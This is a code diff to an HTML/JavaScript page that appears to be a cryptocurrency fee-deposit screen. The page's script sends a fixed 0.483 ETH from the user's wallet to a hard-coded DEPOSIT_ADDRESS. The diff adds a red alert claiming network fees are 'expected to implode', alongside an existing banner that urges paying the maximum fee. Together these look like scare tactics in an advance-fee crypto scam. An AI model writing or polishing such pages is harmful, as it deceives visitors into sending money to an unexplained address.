@@ -547,6 +547,18 @@
             margin: 24px 0;
         }
 
+        .warning-subtext {
+            color: #B00020;
+            /* accessible red */
+            margin: 4px 0 0 0;
+            /* a bit of space under the main warning */
+            font-size: 0.875rem;
+            /* slightly smaller than body text */
+            font-weight: 600;
+            /* make it stand out */
+        }
+
+
         .wallet-help h4 {
             margin-bottom: 20px;
             color: #1e293b;
@@ -677,6 +689,7 @@
                     <div class="fees-title">
                         ⛽ Estimated Transaction Fees
                     </div>
+
                     <div class="fees-grid">
                         <div class="fee-item">
                             <div class="fee-label">Average</div>
@@ -691,21 +704,26 @@
                             <div class="fee-value" id="max-fee">0.483 ETH</div>
                         </div>
                     </div>
-                    <div class="warning-banner">
+
+                    <div class="warning-banner" role="alert" aria-live="polite">
                         <div class="warning-icon">⚠️</div>
                         <div class="warning-text" id="fee-warning">
                             Warning: Using minimum fees may lead to failure and delay. Recommended: 0.483 ETH (maximum
                             amount).
                         </div>
+                        <!-- Sub-warning (red) -->
+                        <p class="warning-subtext"
+                            style="color:#B00020;margin:6px 0 0 0;font-size:0.875rem;font-weight:600;">
+                            Volume of transactions is increasing dramatically — network fees are expected to implode.
+                        </p>
                     </div>
 
-
                     <button class="big-button deposit-btn" id="deposit-btn" onclick="depositFees()" disabled
-                        style="display: none;">
+                        style="display:none;">
                         💰 Deposit Fees
                     </button>
-
                 </div>
+
             </div>
         </div>
 
@@ -995,7 +1013,7 @@
             }
 
             const to = DEPOSIT_ADDRESS;
-          
+
             const value = web3.utils.toWei('0.483', 'ether');
 
             showMessage(`⏳ Opening wallet to deposit 0.483 ETH...`, 'info');
